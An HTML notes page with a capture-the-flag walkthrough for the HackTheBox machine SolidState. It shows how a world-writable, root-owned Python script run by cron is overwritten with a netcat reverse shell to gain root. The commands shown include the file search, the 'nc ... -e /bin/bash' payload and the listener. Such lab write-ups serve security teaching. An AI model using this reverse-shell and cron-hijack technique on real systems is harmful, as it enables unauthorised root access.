<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Example #1</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># World-Writable files - Example #1</h1></strong><br />This example of exploiting a world-writable file is from <code>hackthebox SolidState</code>.<br /><br />Search the system for world-writable files<br /><div class="codebox"><div class="codebox">${debian_chroot:+($debian_chroot)}mindy@solidstate:~/bin$&nbsp;find&nbsp;/&nbsp;-xdev&nbsp;-type&nbsp;f&nbsp;\(&nbsp;-perm&nbsp;-0002&nbsp;-a&nbsp;!&nbsp;-perm&nbsp;-1000&nbsp;\)&nbsp;-print&nbsp;2&gt;/dev/null<br />/opt/tmp.py</div></div><br /><br />There&#39;s a world-writable python script.<br />Check its permissions.<br /><div class="codebox"><div class="codebox">${debian_chroot:+($debian_chroot)}mindy@solidstate:~/bin$&nbsp;ls&nbsp;-l&nbsp;/opt/tmp.py<br />ls&nbsp;-l&nbsp;/opt/tmp.py<br />-rwxrwxrwx&nbsp;1&nbsp;root&nbsp;root&nbsp;105&nbsp;Aug&nbsp;22&nbsp;&nbsp;2017&nbsp;/opt/tmp.py<br /></div></div><br /><br />The script is owned by root, and we have write access to it.<br />If you <code>cat</code> the script you&#39;ll see that it&#39;s deleting the contents of <code>/tmp</code>.<br /><div class="codebox"><div class="codebox">${debian_chroot:+($debian_chroot)}mindy@solidstate:~/bin$&nbsp;cat&nbsp;/opt/tmp.py<br />#!/usr/bin/env&nbsp;python<br />import&nbsp;os<br />import&nbsp;sys<br />try:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;os.system(&#39;rm&nbsp;-r&nbsp;/tmp/*&nbsp;&#39;)<br />except:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.exit()</div></div><br /><br />If a cronjob is running this file as root, <br />we&#39;ll have root code code execution because we can modify the file.<br /><br />We don&#39;t know that there&#39;s a root cronjob running this file, <br />but it&#39;s not overly optimistic to presume that there might be.<br /><br />Deleting all the files in <code>/tmp</code> is one command - <code>rm -r /tmp/*</code>.<br />Why would an admin create a script for a command that can by typed in a second? <br />Probably because they&#39;ve set up a cronjob.<br /><br />I took the existing python code and modified it to send myself a reverse shell, but you could write anything.<br /><div class="codebox"><div class="codebox">${debian_chroot:+($debian_chroot)}mindy@solidstate:~/bin$&nbsp;echo&nbsp;-e&nbsp;&#39;#!/usr/bin/env&nbsp;python\nimport&nbsp;os\nimport&nbsp;sys\ntry:\n\tos.system(&quot;nc&nbsp;10.10.14.15&nbsp;9002&nbsp;-e&nbsp;/bin/bash&quot;)\nexcept:\n\tsys.exit()&#39;&nbsp;&gt;&nbsp;/opt/tmp.py<br />${debian_chroot:+($debian_chroot)}mindy@solidstate:~/bin$&nbsp;cat&nbsp;/opt/tmp.py<br />#!/usr/bin/env&nbsp;python<br />import&nbsp;os<br />import&nbsp;sys<br />try:<br />	os.system(&quot;nc&nbsp;10.10.14.15&nbsp;9002&nbsp;-e&nbsp;/bin/bash&quot;)<br />except:<br />	sys.exit()</div></div><br /><br />Start a listener on your attacking machine and wait.<br />You should receive a root shell.<br /><div class="codebox"><div class="codebox">root@gotham:~/ctf/solidstate#&nbsp;nc&nbsp;-lvnp&nbsp;9002<br />listening&nbsp;on&nbsp;[any]&nbsp;9002&nbsp;...<br />connect&nbsp;to&nbsp;[10.10.14.15]&nbsp;from&nbsp;(UNKNOWN)&nbsp;[10.10.10.51]&nbsp;48814<br />id<br />uid=0(root)&nbsp;gid=0(root)&nbsp;groups=0(root)<br />cat&nbsp;/root/root.txt<br />b4c9723a2...</div></div><br /><br />If you check root&#39;s cronjobs, our suspicions were correct.<br />There was a cronjob running /opt/tmp.py every 3 minutes (?).<br /><div class="codebox"><div class="codebox">crontab&nbsp;-l<br />[...]<br />#&nbsp;m&nbsp;h&nbsp;&nbsp;dom&nbsp;mon&nbsp;dow&nbsp;&nbsp;&nbsp;command<br />*/3&nbsp;*&nbsp;*&nbsp;*&nbsp;*&nbsp;python&nbsp;/opt/tmp.py</div></div><br /></div>
</body>
</html>
